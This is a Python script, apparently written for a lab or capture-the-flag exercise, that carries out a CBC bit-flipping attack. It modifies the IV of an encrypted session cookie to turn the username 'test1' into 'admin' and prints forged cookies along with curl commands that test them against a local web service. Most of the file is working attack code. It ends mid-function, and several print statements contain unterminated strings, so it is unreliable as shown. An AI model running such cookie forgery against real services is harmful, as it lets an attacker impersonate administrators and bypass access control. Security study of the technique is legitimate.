import binascii

def calculate_modified_cookies(original_cookie_hex, old_str="test1", new_str="admin"):
    """Calculate modified cookies for all possible positions"""
    
    cookie_bytes = bytes.fromhex(original_cookie_hex)
    original_iv = cookie_bytes[:16]
    ciphertext = cookie_bytes[16:]
    
    print("="*70)
    print("CBC BIT-FLIPPING ATTACK CALCULATION")
    print("="*70)
    print(f"Original cookie: {original_cookie_hex}")
    print(f"IV (hex):        {original_iv.hex()}")
    print(f"IV (bytes):      {list(original_iv)}")
    print(f"Ciphertext:      {ciphertext.hex()}")
    print(f"\nTarget: Change '{old_str}' to '{new_str}'")
    print(f"String lengths: old={len(old_str)}, new={len(new_str)}")
    
    print(f"\n{'='*70}")
    print("CALCULATING MODIFIED COOKIES FOR EACH POSITION")
    print("="*70)
    
    results = []
    
    # Try each possible position
    for pos in range(16 - len(old_str) + 1):
        print(f"\n{'='*50}")
        print(f"POSITION {pos}:")
        print(f"{'='*50}")
        
        modified_iv = bytearray(original_iv)
        
        print(f"Original IV bytes: {list(original_iv)}")
        print(f"Position {pos}: Changing '{old_str}' → '{new_str}'")
        
        # Calculate the bit flips
        flip_details = []
        for i, (old_char, new_char) in enumerate(zip(old_str, new_str)):
            idx = pos + i
            old_byte = original_iv[idx]
            new_byte = old_byte ^ ord(old_char) ^ ord(new_char)
            modified_iv[idx] = new_byte
            
            flip_details.append({
                'index': idx,
                'old_char': old_char,
                'new_char': new_char,
                'old_iv_byte': old_byte,
                'new_iv_byte': new_byte,
                'xor_mask': ord(old_char) ^ ord(new_char)
            })
            
            print(f"  Byte {idx}: 0x{old_byte:02x} → 0x{new_byte:02x} "
                  f"(XOR mask: 0x{ord(old_char) ^ ord(new_char):02x} = '{old_char}'^'{new_char}')")
        
        # Create the modified cookie
        new_cookie = modified_iv + ciphertext
        new_cookie_hex = new_cookie.hex()
        
        print(f"Modified IV bytes: {list(modified_iv)}")
        print(f"Modified IV (hex): {modified_iv.hex()}")
        print(f"Modified cookie:   {new_cookie_hex}")
        
        results.append({
            'position': pos,
            'cookie': new_cookie_hex,
            'flips': flip_details
        })
    
    return results

def create_curl_commands(results):
    """Create curl commands for testing"""
    print(f"\n{'='*70}")
    print("CURL COMMANDS FOR TESTING")
    print("="*70)
    
    for result in results:
        pos = result['position']
        cookie = result['cookie']
        print(f"\n# Position {pos}:")
        print(f"curl -s http://127.0.0.1:32835/welcome \"
        print(f"  -H 'Cookie: session={cookie}' \"
        print(f"  | grep -i admin")

def create_python_test_code(results):
    """Create Python test code"""
    print(f"\n{'='*70}")
    print("PYTHON TEST CODE")
    print("="*70)
    
    print("""
